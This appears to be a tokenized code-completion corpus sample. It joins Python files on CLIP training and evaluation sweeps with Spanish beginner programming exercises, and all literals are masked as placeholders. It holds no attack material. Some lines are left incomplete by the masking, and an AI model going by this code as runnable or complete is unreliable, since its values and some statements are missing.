<NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ False ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> , <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> , <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> } <EOL> base_only_sweep_params = makeGrid ( base_only_sweep ) + makeGrid ( base_only_baselines ) <EOL> base_only_sweep = [ CLIPAndNegConfig ( ** p ) for p in base_only_sweep_params ] <EOL> final_sweep = { <EOL> "<STR_LIT>" : [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> , <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> } <EOL> final_sweep_baseline = { <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> , <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] , <EOL> "<STR_LIT>" : [ <NUM_LIT> ] , <EOL> } <EOL> final_sweep_params = makeGrid ( final_sweep_baseline ) <EOL> final_sweep = [ CLIPAndNegConfig ( ** p ) for p in final_sweep_params ] <EOL> log_base_folder = os . path . join ( MODEL_PATH , '<STR_LIT>' , f"<STR_LIT>" ) <EOL> os . makedirs ( log_base_folder ) <EOL> log_folder = f"<STR_LIT>" <EOL> executor = submitit . AutoExecutor ( folder = log_folder ) <EOL> executor . update_parameters ( <EOL> slurm_partition = '<STR_LIT>' , <EOL> nodes = <NUM_LIT> , <EOL> timeout_min = <NUM_LIT> * <NUM_LIT> , <EOL> tasks_per_node = <NUM_LIT> , <EOL> gpus_per_node = <NUM_LIT> , <EOL> cpus_per_task = <NUM_LIT> , <EOL> slurm_mem = '<STR_LIT>' , <EOL> slurm_constraint = '<STR_LIT>' , <EOL> ) <EOL> job_array = [ ] <EOL> existing_sweeps = set ( ) <EOL> for sweep_args in base_only_sweep + final_sweep : <EOL> if get_dir_name ( sweep_args ) in existing_sweeps : <EOL> continue <EOL> existing_sweeps . add ( get_dir_name ( sweep_args ) ) <EOL> job = executor . submit ( CLIPTrainJob ( ) , sweep_args ) <EOL> job_array . append ( job ) <EOL> print ( f"<STR_LIT>" ) <EOL> for job in job_array : <EOL> _ = job . result ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == '<STR_LIT>' : <EOL> main ( ) <EOL> </s>
<s> from uuid import uuid4 <EOL> import os <EOL> import json <EOL> from transformers import CLIPProcessor , CLIPModel <EOL> from densely_captioned_images . repro . eval . VLChecklist . vl_checklist . evaluate import Evaluate <EOL> from densely_captioned_images . repro . config import VLC_ROOT_PATH , EVAL_LOG_PATH <EOL> from densely_captioned_images . repro . eval . clip_vlc_wrap import VLCtoHFCLIPWrap <EOL> ATTRIBUTE_YAML = <EOL> OBJECT_YAML = <EOL> RELATION_SPATIAL_YAML = <EOL> RELATION_ACTION_YAML = <EOL> CORPUS_PATH = os . path . join ( VLC_ROOT_PATH , '<STR_LIT>' ) <EOL> LOG_PATH = os . path . join ( EVAL_LOG_PATH , '<STR_LIT>' ) <EOL> def score_vlc ( model_name , swig_only = False ) : <EOL> m = json . load ( open ( CORPUS_PATH ) ) <EOL> if swig_only : <EOL> m = { <EOL> task_name : { <EOL> ds_name : ds_split <EOL> for ds_name , ds_split in task_split . items ( ) <EOL> if '<STR_LIT>' in ds_name <EOL> } for task_name , task_split in m . items ( ) <EOL> } <EOL> score_list = [ ] <EOL> filepath = os . path . join ( LOG_PATH , model_name , '<STR_LIT>' ) <EOL> for item in m . keys ( ) : <EOL> data_num = len ( m [ item ] . keys ( ) ) <EOL> data_score = [ ] <EOL> if data_num == <NUM_LIT> : <EOL> score_list . append ( <NUM_LIT> ) <EOL> continue <EOL> for data in m [ item ] . keys ( ) : <EOL> score = <NUM_LIT> <EOL> file_num = len ( m [ item ] [ data ] ) <EOL> if file_num == <NUM_LIT> : <EOL> data_score . append ( <NUM_LIT> ) <EOL> continue <EOL> for file in m [ item ] [ data ] : <EOL> json_name = os . path . join ( filepath , f"<STR_LIT>" ) <EOL> if not os . path . exists ( json_name ) : <EOL> print ( f"<STR_LIT>" ) <EOL> return <EOL> else : <EOL> m1 = json . load ( open ( json_name ) ) <EOL> score += m1 [ "<STR_LIT>" ] <EOL> data_score . append ( score / file_num ) <EOL> score_list . append ( sum ( data_score ) / data_num ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( list ( zip ( score_list , [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] ) ) ) <EOL> overall_scores = [ sum ( score_list [ <NUM_LIT> : <NUM_LIT> ] ) / <NUM_LIT> , sum ( score_list [ <NUM_LIT> : <NUM_LIT> ] ) / <NUM_LIT> , sum ( score_list [ <NUM_LIT> : ] ) / <NUM_LIT> ] <EOL> print ( "<STR_LIT>" ) <EOL> print ( list ( zip ( overall_scores , [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] ) ) ) <EOL> def run_vlc_on_model ( model : CLIPModel , processor : CLIPProcessor , model_name = None ) : <EOL> if model_name is None : <EOL> model_name = str ( uuid4 ( ) ) <EOL> wrap_model = VLCtoHFCLIPWrap ( model_name , model , processor ) <EOL> tasks = [ '<STR_LIT>' ] <EOL> output_dirname = os . path . join ( EVAL_LOG_PATH , '<STR_LIT>' , model_name ) <EOL> os . makedirs ( output_dirname , exist_ok = True ) <EOL> for task in tasks : <EOL> for BASE_YAML in [ ATTRIBUTE_YAML , OBJECT_YAML , RELATION_SPATIAL_YAML , RELATION_ACTION_YAML ] : <EOL> yaml = BASE_YAML . format ( model_name = model_name , task = task , output_dirname = output_dirname ) <EOL> yaml_path = os . path . join ( EVAL_LOG_PATH , f"<STR_LIT>" ) <EOL> with open ( yaml_path , '<STR_LIT>' ) as yaml_file : <EOL> yaml_file . write ( yaml ) <EOL> evaluator = Evaluate ( config_file = yaml_path , model = wrap_model ) <EOL> evaluator . start ( ) <EOL> os . unlink ( yaml_path ) <EOL> score_vlc ( model_name ) <EOL> if __name__ == '<STR_LIT>' : <EOL> from transformers import CLIPProcessor , CLIPModel <EOL> clip_model = CLIPModel . from_pretrained ( "<STR_LIT>" ) <EOL> clip_processor = CLIPProcessor . from_pretrained ( "<STR_LIT>" ) <EOL> run_vlc_on_model ( clip_model , clip_processor , model_name = '<STR_LIT>' ) <EOL> </s>
<s> from densely_captioned_images . repro . eval . run_full_evals import CLIPEvalConfig , CLIPEvalJob <EOL> from densely_captioned_images . repro . config import MODEL_PATH , DENSE_CAPS_DIR <EOL> import submitit <EOL> import os <EOL> DO_FULL = False <EOL> def main ( ) : <EOL> with open ( os . path . join ( DENSE_CAPS_DIR , '<STR_LIT>' ) ) as f : <EOL> MODEL_FILES = [ <EOL> os . path . join ( MODEL_PATH , m . strip ( ) ) <EOL> for m in f . readlines ( ) <EOL> ] <EOL> print ( "<STR_LIT>" , len ( MODEL_FILES ) ) <EOL> eval_sweep = [ ] <EOL> if not DO_FULL : <EOL> for shots in [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] : <EOL> eval_sweep += [ <EOL> CLIPEvalConfig ( <EOL> run_aro = False , <EOL> run_vlc = False , <EOL> run_dense_cap = False , <EOL> run_winoground = False , <EOL> run_elevater = shots , <EOL> lora_weight_location = model_path , <EOL> model_name = model_path . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] <EOL> ) for model_path in MODEL_FILES <EOL> ] <EOL> else : <EOL> for dataset in range ( <NUM_LIT> ) : <EOL> eval_sweep += [ <EOL> CLIPEvalConfig ( <EOL> run_aro = False , <EOL> run_vlc = False , <EOL> run_dense_cap = False , <EOL> run_winoground = False , <EOL> run_elevater = - <NUM_LIT> , <EOL> elevater_dataset = dataset , <EOL> lora_weight_location = model_path , <EOL> model_name = model_path . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] <EOL> ) for model_path in MODEL_FILES <EOL> ] <EOL> log_base_folder = os . path . join ( MODEL_PATH , '<STR_LIT>' , f"<STR_LIT>" ) <EOL> os . makedirs ( log_base_folder , exist_ok = True ) <EOL> log_folder = f"<STR_LIT>" <EOL> executor = submitit . AutoExecutor ( folder = log_folder ) <EOL> executor . update_parameters ( <EOL> slurm_partition = '<STR_LIT>' , <EOL> nodes = <NUM_LIT> , <EOL> timeout_min = <NUM_LIT> * <NUM_LIT> * <NUM_LIT> , <EOL> tasks_per_node = <NUM_LIT> , <EOL> gpus_per_node = <NUM_LIT> , <EOL> cpus_per_task = <NUM_LIT> , <EOL> slurm_mem = '<STR_LIT>' , <EOL> ) <EOL> job_array = [ ] <EOL> for sweep_args in eval_sweep : <EOL> job = executor . submit ( CLIPEvalJob ( ) , sweep_args ) <EOL> job_array . append ( job ) <EOL> print ( f"<STR_LIT>" ) <EOL> for job in job_array : <EOL> _ = job . result ( ) <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == '<STR_LIT>' : <EOL> main ( ) <EOL> </s>
<s> from densely_captioned_images . repro . eval . VLChecklist . vl_checklist . vlp_model import VLPModel <EOL> import torch <EOL> from PIL import Image <EOL> class VLCtoHFCLIPWrap ( VLPModel ) : <EOL> def __init__ ( self , model_id , model , processor , device = None ) : <EOL> self . model = model <EOL> self . processor = processor <EOL> if device is None : <EOL> device = model . device <EOL> self . device = device <EOL> self . model_id = model_id <EOL> self . batch_size = <NUM_LIT> <EOL> def model_name ( self ) : <EOL> return self . model_id <EOL> def _load_data ( self , src_type , data ) : <EOL> pass <EOL> def predict ( self , <EOL> images : list , <EOL> texts : list , <EOL> src_type : str = '<STR_LIT>' <EOL> ) : <EOL> loaded_images = [ Image . open ( p ) for p in images ] <EOL> with torch . no_grad ( ) : <EOL> inputs = self . processor ( text = texts , images = loaded_images , return_tensors = '<STR_LIT>' , padding = True ) <EOL> res = self . model ( ** inputs . to ( self . device ) ) <EOL> logits_per_image = res . logits_per_image <EOL> probs = [ ] <EOL> probs . extend ( logits_per_image . cpu ( ) . diag ( ) . numpy ( ) ) <EOL> return { "<STR_LIT>" : [ ( None , p ) for p in probs ] } <EOL> </s>
<s> import zipfile <EOL> with zipfile . ZipFile ( "<STR_LIT>" , "<STR_LIT>" ) as archivo : <EOL> archivo . write ( "<STR_LIT>" , arcname = "<STR_LIT>" ) <EOL> with zipfile . ZipFile ( "<STR_LIT>" , "<STR_LIT>" ) as archivo : <EOL> archivo . extractall ( "<STR_LIT>" ) <EOL> </s>
<s> class Figura : <EOL> def __init__ ( self , base , altura ) : <EOL> self . base = base <EOL> self . altura = altura <EOL> class Poligono : <EOL> def dar_nombre ( self , nombre ) : <EOL> return f"<STR_LIT>" <EOL> class Rectangulo ( Figura , Poligono ) : <EOL> def calcular_area ( self ) : <EOL> return self . base * self . altura <EOL> class Triangulo ( Figura ) : <EOL> def calcular_area ( self ) : <EOL> return ( self . base * self . altura ) // <NUM_LIT> <EOL> rectangulo = Rectangulo ( <NUM_LIT> , <NUM_LIT> ) <EOL> triangulo = Triangulo ( <NUM_LIT> , <NUM_LIT> ) <EOL> print ( "<STR_LIT>" , rectangulo . calcular_area ( ) ) <EOL> print ( "<STR_LIT>" , triangulo . calcular_area ( ) ) <EOL> print ( rectangulo . dar_nombre ( "<STR_LIT>" ) ) <EOL> </s>
<s> __all__ = [ '<STR_LIT>' , '<STR_LIT>' ] <EOL> def funcion2 ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> class Clase2 : <EOL> def metodo2 ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> from flask import Flask , render_template , request , redirect , url_for <EOL> app = Flask ( __name__ ) <EOL> data = [ <EOL> { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : "<STR_LIT>" } <EOL> ] <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def index ( ) : <EOL> return render_template ( "<STR_LIT>" , datos = data ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def add_element ( ) : <EOL> if request . method == '<STR_LIT>' : <EOL> nuevo_nombre = request . form [ '<STR_LIT>' ] <EOL> nuevo_id = max ( dato [ '<STR_LIT>' ] for dato in data ) + <NUM_LIT> <EOL> data . append ( { "<STR_LIT>" : nuevo_id , "<STR_LIT>" : nuevo_nombre } ) <EOL> return redirect ( url_for ( '<STR_LIT>' ) ) <EOL> if __name__ == '<STR_LIT>' : <EOL> app . run ( debug = True ) <EOL> </s>
<s> class Archivo : <EOL> def __init__ ( self , nombre_archivo ) : <EOL> self . archivo = open ( nombre_archivo , '<STR_LIT>' ) <EOL> def __del__ ( self ) : <EOL> self . archivo . close ( ) <EOL> archivo_instancia = Archivo ( "<STR_LIT>" ) <EOL> archivo_instancia . archivo . write ( "<STR_LIT>" ) <EOL> del archivo_instancia <EOL> </s>
<s> from pymongo import MongoClient <EOL> client = MongoClient ( '<STR_LIT>' , <NUM_LIT> ) <EOL> db = client [ '<STR_LIT>' ] <EOL> collection = db [ '<STR_LIT>' ] <EOL> usuarios = [ <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } } <EOL> ] <EOL> collection . insert_many ( usuarios ) <EOL> users_36_years = collection . find ( { "<STR_LIT>" : <NUM_LIT> } ) <EOL> for user in users_36_years : <EOL> print ( user ) <EOL> pipeline = [ <EOL> { "<STR_LIT>" : { "<STR_LIT>" : None , "<STR_LIT>" : { "<STR_LIT>" : "<STR_LIT>" } } } <EOL> ] <EOL> promedio_edad = collection . aggregate ( pipeline ) <EOL> for resultado in promedio_edad : <EOL> print ( resultado ) <EOL> </s>
<s> import random <EOL> def metodo_burbuja ( lista ) : <EOL> n = len ( lista ) <EOL> cambio = True <EOL> while cambio : <EOL> cambio = False <EOL> for i in range ( n - <NUM_LIT> ) : <EOL> if lista [ i ] > lista [ i + <NUM_LIT> ] : <EOL> lista [ i ] , lista [ i + <NUM_LIT> ] = lista [ i + <NUM_LIT> ] , lista [ i ] <EOL> cambio = True <EOL> return lista <EOL> lista_aleatoria = [ random . randint ( <NUM_LIT> , <NUM_LIT> ) for _ in range ( <NUM_LIT> ) ] <EOL> print ( lista_aleatoria ) <EOL> print ( metodo_burbuja ( lista_aleatoria ) ) <EOL> </s>
<s> tupla1 = ( <NUM_LIT> , <NUM_LIT> , "<STR_LIT>" , True ) <EOL> lista1 = [ <NUM_LIT> , <NUM_LIT> , "<STR_LIT>" , True ] <EOL> super_tupla = tupla1 , ( <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> print ( super_tupla ) <EOL> lista1 [ <NUM_LIT> ] = '<STR_LIT>' <EOL> print ( lista1 ) <EOL> super_tupla [ <NUM_LIT> ] [ <NUM_LIT> ] = '<STR_LIT>' <EOL> print ( super_tupla ) <EOL> super_lista = list ( super_tupla ) <EOL> print ( super_lista ) <EOL> vacia = ( ) <EOL> singleton_uwu = "<STR_LIT>" <EOL> print ( vacia ) <EOL> print ( singleton_uwu ) <EOL> </s>
<s> import copy <EOL> lista1 = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , [ <NUM_LIT> , <NUM_LIT> , [ <NUM_LIT> ] ] ] <EOL> lista1_copia_superficial = lista1 . copy ( ) <EOL> lista1_copia_profunda = copy . deepcopy ( lista1 ) <EOL> lista1 [ <NUM_LIT> ] . append ( <NUM_LIT> ) <EOL> lista1 [ <NUM_LIT> ] [ <NUM_LIT> ] . append ( <NUM_LIT> ) <EOL> print ( lista1 ) <EOL> print ( lista1_copia_superficial ) <EOL> print ( lista1_copia_profunda ) <EOL> </s>
<s> def busqueda_binaria ( lista , x ) : <EOL> low = <NUM_LIT> <EOL> high = len ( lista ) - <NUM_LIT> <EOL> mid = <NUM_LIT> <EOL> while low <= high : <EOL> mid = ( high + low ) // <NUM_LIT> <EOL> if lista [ mid ] < x : <EOL> low = mid + <NUM_LIT> <EOL> elif lista [ mid ] > x : <EOL> high = mid - <NUM_LIT> <EOL> else : <EOL> return mid <EOL> return - <NUM_LIT> <EOL> lista = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> x = <NUM_LIT> <EOL> resultado = busqueda_binaria ( lista , x ) <EOL> if resultado != - <NUM_LIT> : <EOL> print ( "<STR_LIT>" , resultado ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> class Animal : <EOL> def __init__ ( self , nombre ) : <EOL> self . nombre = nombre <EOL> class Perro ( Animal ) : <EOL> def __init__ ( self , nombre , raza ) : <EOL> super ( ) . __init__ ( nombre ) <EOL> self . raza = raza <EOL> def hacer_sonido ( self ) : <EOL> print ( f"<STR_LIT>" ) <EOL> def correr ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> class Gato ( Animal ) : <EOL> def __init__ ( self , nombre , raza ) : <EOL> super ( ) . __init__ ( nombre ) <EOL> self . raza = raza <EOL> def hacer_sonido ( self ) : <EOL> print ( f"<STR_LIT>" ) <EOL> def correr ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> class Persona ( Animal ) : <EOL> def __init__ ( self , nombre ) : <EOL> super ( ) . __init__ ( nombre ) <EOL> def hacer_sonido ( self ) : <EOL> print ( f"<STR_LIT>" ) <EOL> def correr ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> def sonido_animal ( animal ) : <EOL> animal . hacer_sonido ( ) <EOL> def correr ( animal ) : <EOL> animal . correr ( ) <EOL> brujita = Gato ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> jesus = Persona ( "<STR_LIT>" ) <EOL> sonido_animal ( brujita ) <EOL> correr ( brujita ) <EOL> sonido_animal ( jesus ) <EOL> correr ( jesus ) <EOL> </s>
<s> def esta_es_una_funcion ( ) : <EOL> return "<STR_LIT>" <EOL> class Mapping : <EOL> def __init__ ( self , objeto_iterable ) : <EOL> self . lista = [ ] <EOL> self . __actualizar ( objeto_iterable ) <EOL> def actualizar ( self , obbjeto_iterable ) : <EOL> for item in obbjeto_iterable : <EOL> self . lista . append ( item ) <EOL> __actualizar = actualizar <EOL> class MappingSubClass ( Mapping ) : <EOL> def actualizar ( self , keys , values ) : <EOL> for item in zip ( keys , values ) : <EOL> self . lista . append ( item ) <EOL> instancia = MappingSubClass ( [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> instancia . actualizar ( [ '<STR_LIT>' ] , [ '<STR_LIT>' ] ) <EOL> print ( instancia . lista ) <EOL> numeros = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> colores = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> autos = [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> combinados = zip ( numeros , colores , autos ) <EOL> for elemento in combinados : <EOL> print ( elemento ) <EOL> </s>
<s> nombres = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> edades = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> ciudades = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] <EOL> combinado = list ( zip ( nombres , edades , ciudades ) ) <EOL> print ( combinado ) <EOL> print ( "<STR_LIT>" ) <EOL> for nombre , edad , ciudad in combinado : <EOL> print ( f"<STR_LIT>" ) <EOL> </s>
<s> while True : <EOL> try : <EOL> file = open ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> edad = int ( input ( "<STR_LIT>" ) ) <EOL> file . write ( "<STR_LIT>" + str ( edad ** <NUM_LIT> ) ) <EOL> print ( "<STR_LIT>" ) <EOL> break <EOL> except KeyboardInterrupt : <EOL> print ( "<STR_LIT>" ) <EOL> break <EOL> except IOError : <EOL> print ( "<STR_LIT>" ) <EOL> except ValueError ( "<STR_LIT>" ) as error : <EOL> print ( "<STR_LIT>" ) <EOL> finally : <EOL> file . close ( ) <EOL> print ( "<STR_LIT>" ) <EOL> </s>
<s> __all__ = [ '<STR_LIT>' ] <EOL> </s>
<s> __all__ = [ '<STR_LIT>' , '<STR_LIT>' ] <EOL> </s>
<s> from collections import deque <EOL> alumnos = deque ( [ "<STR_LIT>" , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> print ( alumnos ) <EOL> alumnos . append ( "<STR_LIT>" ) <EOL> alumnos . append ( "<STR_LIT>" ) <EOL> print ( alumnos ) <EOL> alumnos . popleft ( ) <EOL> print ( alumnos ) <EOL> alumnos . popleft ( ) <EOL> print ( alumnos ) <EOL> print ( "<STR_LIT>" ) <EOL> cola1 = [ ] <EOL> cola1 . append ( "<STR_LIT>" ) <EOL> cola1 . append ( "<STR_LIT>" ) <EOL> cola1 . append ( "<STR_LIT>" ) <EOL> print ( cola1 ) <EOL> cola1 . pop ( <NUM_LIT> ) <EOL> print ( cola1 ) <EOL> cola1 . pop ( <NUM_LIT> ) <EOL> print ( cola1 ) <EOL> </s>
<s> print ( "<STR_LIT>" ) <EOL> for n in range ( <NUM_LIT> , <NUM_LIT> ) : <EOL> es_primo = True <EOL> for x in range ( <NUM_LIT> , n ) : <EOL> if n % x == <NUM_LIT> : <EOL> es_primo = False <EOL> break <EOL> if es_primo : <EOL> print ( n , "<STR_LIT>" ) <EOL> print ( "<STR_LIT>" ) <EOL> for num in range ( <NUM_LIT> , <NUM_LIT> ) : <EOL> if num % <NUM_LIT> == <NUM_LIT> : <EOL> print ( num , "<STR_LIT>" ) <EOL> continue <EOL> print ( num , "<STR_LIT>" ) <EOL> </s>
<s> from app import app <EOL> if __name__ == "<STR_LIT>" : <EOL> app . run ( debug = True ) <EOL> </s>
<s> import datetime <EOL> ahora = datetime . datetime . now ( ) <EOL> print ( ahora ) <EOL> futuro = ahora + datetime . timedelta ( days = <NUM_LIT> ) <EOL> print ( futuro ) <EOL> </s>
<s> class Motor : <EOL> def iniciar ( self ) : <EOL> motor_iniciado = True <EOL> print ( "<STR_LIT>" ) <EOL> return motor_iniciado <EOL> class CajaVelocidades : <EOL> def cambiar_velocidad ( self , subir = False ) : <EOL> if subir : <EOL> print ( "<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> class Carro : <EOL> def __init__ ( self ) : <EOL> self . motor_iniciado = False <EOL> self . motor = Motor ( ) <EOL> self . velocidades = CajaVelocidades ( ) <EOL> def iniciar_motor ( self ) : <EOL> self . motor_iniciado = self . motor . iniciar ( ) <EOL> def cambiar_marcha ( self , subir = False ) : <EOL> if self . motor_iniciado : <EOL> self . velocidades . cambiar_velocidad ( subir ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> mi_coche = Carro ( ) <EOL> mi_coche . iniciar_motor ( ) <EOL> mi_coche . cambiar_marcha ( True ) <EOL> </s>
<s> class Persona : <EOL> def accion_recibida ( self , insulto , golpe = None ) : <EOL> if golpe is None : <EOL> print ( f"<STR_LIT>" ) <EOL> else : <EOL> print ( f"<STR_LIT>" ) <EOL> jesus = Persona ( ) <EOL> jesus . accion_recibida ( "<STR_LIT>" ) <EOL> jesus . accion_recibida ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> class MiClase : <EOL> def mi_metodo ( self , * args ) : <EOL> if len ( args ) == <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> elif len ( args ) == <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> else : <EOL> print ( "<STR_LIT>" ) <EOL> clase = MiClase ( ) <EOL> clase . mi_metodo ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> </s>
<s> def funcion ( ) : <EOL> raise ConnectionError <EOL> try : <EOL> funcion ( ) <EOL> except ConnectionError as error : <EOL> raise RuntimeError ( "<STR_LIT>" ) from error <EOL> </s>
<s> import numpy as np <EOL> class Circulo : <EOL> def __init__ ( self , radio ) : <EOL> self . _radio = radio <EOL> @ property <EOL> def radio ( self ) : <EOL> return self . _radio <EOL> @ radio . setter <EOL> def radio ( self , valor ) : <EOL> if valor < <NUM_LIT> : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> self . _radio = valor <EOL> @ property <EOL> def diametro ( self ) : <EOL> return self . _radio * <NUM_LIT> <EOL> @ property <EOL> def area ( self ) : <EOL> return np . pi * self . _radio ** <NUM_LIT> <EOL> mi_circulo = Circulo ( <NUM_LIT> ) <EOL> print ( mi_circulo . radio ) <EOL> print ( mi_circulo . diametro ) <EOL> print ( mi_circulo . area ) <EOL> mi_circulo . radio = <NUM_LIT> <EOL> print ( mi_circulo . radio ) <EOL> print ( mi_circulo . diametro ) <EOL> print ( mi_circulo . area ) <EOL> </s>
<s> from flask import Flask <EOL> from flask_pymongo import PyMongo <EOL> from flask_uploads import UploadSet , configure_uploads , IMAGES <EOL> from werkzeug . utils import secure_filename <EOL> from werkzeug . datastructures import FileStorage <EOL> app = Flask ( __name__ ) <EOL> app . config [ "<STR_LIT>" ] = "<STR_LIT>" <EOL> mongo = PyMongo ( app ) <EOL> photos = UploadSet ( '<STR_LIT>' , IMAGES ) <EOL> app . config [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> configure_uploads ( app , photos ) <EOL> from app import routes <EOL> </s>
<s> class Animal : <EOL> def __init__ ( self , nombre ) : <EOL> self . nombre = nombre <EOL> class Perro ( Animal ) : <EOL> especie = "<STR_LIT>" <EOL> def __init__ ( self , nombre , raza ) : <EOL> super ( ) . __init__ ( nombre ) <EOL> if not isinstance ( nombre , str ) : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> if not isinstance ( raza , str ) : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> self . __raza = raza <EOL> def get_raza ( self ) : <EOL> return self . __raza <EOL> def set_raza ( self , nombre ) : <EOL> self . __raza = nombre <EOL> def ladrar ( self ) : <EOL> print ( f"<STR_LIT>" ) <EOL> puppy = Perro ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> manchas = Perro ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> print ( puppy . nombre ) <EOL> print ( puppy . get_raza ( ) ) <EOL> puppy . set_raza ( "<STR_LIT>" ) <EOL> print ( puppy . get_raza ( ) ) <EOL> print ( manchas . get_raza ( ) ) <EOL> print ( Perro . especie ) <EOL> print ( puppy . especie ) <EOL> manchas . ladrar ( ) 